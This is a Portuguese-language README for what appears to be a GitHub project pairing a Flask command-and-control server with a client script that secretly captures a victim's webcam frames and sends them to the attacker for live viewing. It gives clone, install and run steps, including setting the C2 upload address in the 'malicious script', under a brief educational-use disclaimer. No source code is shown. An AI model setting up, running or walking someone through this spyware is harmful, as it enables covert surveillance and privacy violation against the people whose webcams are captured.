# README.md

<h1>C2 Server - Webcam Stream Capture</h1>

<p>Este projeto demonstra o funcionamento de um servidor C2 (Command and Control) que captura frames da webcam da máquina da vítima e os envia para um servidor remoto. O código inclui tanto o lado do servidor C2 quanto o script malicioso do cliente que coleta e envia os frames. <strong>Este código é apenas para fins educacionais e de conscientização sobre segurança, e seu uso mal-intencionado é ilegal.</strong></p>

<hr>

<h2>📋 Descrição</h2>

<p><strong>O que acontece:</strong></p>

<ol>
    <li>O script acessa a webcam da vítima, captura frames periodicamente e os codifica em base64.</li>
    <li>Esses frames são enviados ao servidor C2.</li>
    <li>O servidor C2 armazena os frames recebidos e os exibe em tempo real através de uma interface web, permitindo que um invasor visualize a transmissão da webcam da vítima.</li>
</ol>

<hr>

<h2>🚀 Tecnologias e Bibliotecas Utilizadas</h2>

<ul>
    <li><strong>Flask</strong>: Framework web usado para o servidor C2.</li>
    <li><strong>OpenCV</strong>: Usado para capturar frames da webcam.</li>
    <li><strong>Pillow</strong>: Biblioteca de imagem para manipular e salvar os frames.</li>
    <li><strong>Requests</strong>: Para enviar os frames do cliente ao servidor.</li>
    <li><strong>HTML/CSS/JavaScript</strong>: Para exibir os frames na interface do servidor.</li>
</ul>

<hr>

<h2>⚙️ Instalação</h2>

<h3>Passo 1: Clonar o repositório</h3>

<pre><code>git clone https://github.com/niklaz4/C2-control-and-webcam.git
cd C2-control-and-webcam
</code></pre>

<h3>Passo 2: Criar e ativar o ambiente virtual (venv)</h3>

<p>Para isolar as dependências do projeto, é recomendável criar um ambiente virtual.</p>

<ul>
    <li>Em sistemas Unix ou MacOS:</li>
    <pre><code>python3 -m venv venv</code></pre>
    <li>Ativar o ambiente virtual:</li>
    <pre><code>source venv/bin/activate</code></pre>
    
    <li>Em sistemas Windows:</li>
    <pre><code>python -m venv venv</code></pre>
    <li>Ativar o ambiente virtual:</li>
    <pre><code>venv\Scripts\activate</code></pre>
</ul>

<h3>Passo 3: Instalar as dependências</h3>

<p>Com o ambiente virtual ativado, instale o <strong>Flask</strong> e as bibliotecas necessárias usando o pip:</p>

<pre><code>pip install Flask pillow requests opencv-python</code></pre>

<hr>

<h2>📷 Instruções de Execução</h2>

<h3>1. Configurar e executar o servidor C2:</h3>

<p>Execute o servidor C2:</p>

<pre><code>python c2_server.py</code></pre>

<p>O servidor será iniciado e escutará na porta <strong>5000</strong>. Acesse o endereço no navegador: <code>http://localhost:5000</code></p>

<h3>2. Configurar o codigo malicioso:</h3>

<p>No script <code>webcam.py</code>, defina o endereço IP do servidor C2 na variável <code>c2_server</code>. Por exemplo:</p>

<pre><code>c2_server = "http://192.168.1.100:5000/upload"</code></pre>

<h3>3. Iniciar o script malicioso:</h3>

<p>Execute o codigo que enviará os frames da webcam para o servidor C2:</p>

<pre><code>python webcam.py</code></pre>

<hr>



